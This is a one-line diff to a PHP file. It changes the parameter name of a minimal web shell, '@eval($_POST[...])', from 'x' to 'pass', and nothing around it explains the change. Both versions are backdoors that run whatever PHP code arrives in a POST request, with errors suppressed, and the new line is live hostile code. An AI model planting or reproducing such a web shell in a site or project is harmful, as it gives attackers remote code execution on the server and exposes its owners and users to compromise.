@@ -1,1 +1,1 @@
-<?php @eval($_POST['x']);?>
+<?php @eval($_POST['pass']);?>
